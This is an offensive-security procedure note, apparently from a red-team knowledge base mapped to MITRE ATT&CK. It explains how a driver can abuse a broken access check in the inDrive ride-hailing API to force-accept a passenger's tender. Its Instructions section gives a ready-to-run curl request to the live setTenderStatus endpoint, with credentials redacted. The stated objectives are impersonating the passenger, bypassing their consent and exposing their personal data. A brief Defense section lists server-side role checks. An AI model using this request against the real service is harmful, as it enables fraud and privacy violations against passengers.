---
id: p3b4c5d6-e7f8-9012-cdef-3456789012
tags:
  - indrive
  - access-control
  - impersonation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-indrive-settenderstatus]]'
verified: false
platforms:
  - Mobile App
  - Web API
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:25:17.866Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# Force-Accept-Tender-Status-via-API

## Summary

This procedure exploits improper access control in the inDrive /api/setTenderStatus endpoint, allowing a driver to set a tender's status to 'accept' without passenger consent, impersonating approval and granting unauthorized ride access.

## Description

The endpoint fails to verify requester identity, permitting drivers to use tender_id/order_id from their bids to force acceptance. This bypasses the negotiation flow, auto-accepting rides. Prerequisites: IDs from driverrequest. Outcomes: Ride accepted, PII exposed, fares locked.

## Requirements

1. tender_id and order_id from prior bid submission
2. Driver's phone and token for auth
3. Updated stream_id for session continuity
4. HTTP GET client

## Defense

Defensive measures and detection strategies:

- Enforce role-based access: Only passengers can accept tenders
- Validate tender ownership and requester role server-side
- Alert on status changes without UI confirmation

## Objectives

1. Impersonate passenger acceptance
2. Bypass consent for ride initiation
3. Enable PII access and price enforcement

## Instructions

### Step 1: Prepare Acceptance Parameters

**Context**: Use IDs from bid response; ensure session params like stream_id are current.

No command; extract from previous response.

### Step 2: Set Tender Status to Accept

**Context**: Send request to force acceptance, exploiting auth gap.

**Command** ([[commands/curl-indrive-settenderstatus]]):
```bash
curl "https://terra-akamai.indriverapp.com/api/setTenderStatus?cid=5957&locale=en_US&phone=████&token=████████&v=7&stream_id=1682280490209367&tender_id=████████&order_id=█████████&status=accept"
```

> Command sets status=accept. Expected: Success response; ride updates. Fail if IDs invalid.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Valid Accounts]] Valid Accounts

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-indrive-settenderstatus]]

## Tools Used

- None

## Tags

- [[indrive]]
- [[access-control]]
- [[impersonation]]
